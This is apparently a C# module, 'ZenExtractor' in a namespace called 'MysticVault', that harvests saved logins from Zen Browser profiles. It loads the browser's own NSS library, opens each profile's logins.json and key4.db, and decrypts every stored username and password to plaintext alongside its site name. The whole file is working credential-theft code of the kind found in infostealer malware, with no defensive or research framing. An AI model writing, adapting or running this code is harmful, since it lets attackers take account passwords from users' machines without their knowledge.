using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
namespace MysticVault
{
    public static class ZenExtractor
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool SetDllDirectory(string? lpPathName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSS_Init(string configdir);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSS_Shutdown();
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_Decrypt(ref SECItem data, ref SECItem result, IntPtr cx);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate void SECITEM_ZfreeItem(ref SECItem item, bool freeItem);
        [StructLayout(LayoutKind.Sequential)]
        public struct SECItem
        {
            public int type;
            public IntPtr data;
            public int len;
        }
        public static List<ExtractedCredential> ExtractAll()
        {
            var results = new List<ExtractedCredential>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string zenProfiles = Path.Combine(appData, "zen", "Profiles");
            if (!Directory.Exists(zenProfiles)) return results;
            string zenInstallDir = @"C:\Program Files\Zen Browser";
            if (!Directory.Exists(zenInstallDir)) return results;
            SetDllDirectory(zenInstallDir);
            IntPtr mozglue = LoadLibrary("mozglue.dll");
            IntPtr nss3 = LoadLibrary("nss3.dll");
            if (nss3 == IntPtr.Zero)
            {
                SetDllDirectory(null);
                return results;
            }
            try
            {
                var initPtr = GetProcAddress(nss3, "NSS_Init");
                var shutdownPtr = GetProcAddress(nss3, "NSS_Shutdown");
                var decryptPtr = GetProcAddress(nss3, "PK11SDR_Decrypt");
                var freePtr = GetProcAddress(nss3, "SECITEM_ZfreeItem");
                if (initPtr == IntPtr.Zero || decryptPtr == IntPtr.Zero) return results;
                var nssInit = Marshal.GetDelegateForFunctionPointer<NSS_Init>(initPtr);
                var nssShutdown = Marshal.GetDelegateForFunctionPointer<NSS_Shutdown>(shutdownPtr);
                var pk11SdrDecrypt = Marshal.GetDelegateForFunctionPointer<PK11SDR_Decrypt>(decryptPtr);
                var secItemFree = Marshal.GetDelegateForFunctionPointer<SECITEM_ZfreeItem>(freePtr);
                foreach (var profileDir in Directory.GetDirectories(zenProfiles))
                {
                    string loginsPath = Path.Combine(profileDir, "logins.json");
                    string key4Path = Path.Combine(profileDir, "key4.db");
                    if (!File.Exists(loginsPath) || !File.Exists(key4Path)) continue;
                    if (nssInit(profileDir) != 0) continue;
                    try
                    {
                        string json = File.ReadAllText(loginsPath);
                        using (JsonDocument doc = JsonDocument.Parse(json))
                        {
                            if (doc.RootElement.TryGetProperty("logins", out JsonElement loginsArray))
                            {
                                foreach (JsonElement login in loginsArray.EnumerateArray())
                                {
                                    string hostname = login.GetProperty("hostname").GetString() ?? "";
                                    string encUser = login.GetProperty("encryptedUsername").GetString() ?? "";
                                    string encPass = login.GetProperty("encryptedPassword").GetString() ?? "";
                                    string username = Decrypt(encUser, pk11SdrDecrypt, secItemFree);
                                    string password = Decrypt(encPass, pk11SdrDecrypt, secItemFree);
                                    if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(password))
                                    {
                                        results.Add(new ExtractedCredential(hostname, username, password));
                                    }
                                }
                            }
                        }
                    }
                    finally
                    {
                        nssShutdown();
                    }
                }
            }
            finally
            {
                if (nss3 != IntPtr.Zero) FreeLibrary(nss3);
                if (mozglue != IntPtr.Zero) FreeLibrary(mozglue);
                SetDllDirectory(null);
            }
            return results;
        }
        private static string Decrypt(string base64Encrypted, PK11SDR_Decrypt decryptFunc, SECITEM_ZfreeItem freeFunc)
        {
            if (string.IsNullOrEmpty(base64Encrypted)) return "";
            byte[] decoded = Convert.FromBase64String(base64Encrypted);
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(decoded.Length);
            Marshal.Copy(decoded, 0, unmanagedPointer, decoded.Length);
            SECItem inItem = new SECItem
            {
                type = 0,
                data = unmanagedPointer,
                len = decoded.Length
            };
            SECItem outItem = new SECItem();
            string decryptedStr = "";
            try
            {
                if (decryptFunc(ref inItem, ref outItem, IntPtr.Zero) == 0)
                {
                    if (outItem.len > 0 && outItem.data != IntPtr.Zero)
                    {
                        byte[] decryptedBytes = new byte[outItem.len];
                        Marshal.Copy(outItem.data, decryptedBytes, 0, outItem.len);
                        decryptedStr = Encoding.UTF8.GetString(decryptedBytes);
                    }
                }
            }
            finally
            {
                if (outItem.data != IntPtr.Zero)
                {
                    freeFunc(ref outItem, false);
                }
                Marshal.FreeHGlobal(unmanagedPointer);
            }
            return decryptedStr;
        }
    }
}
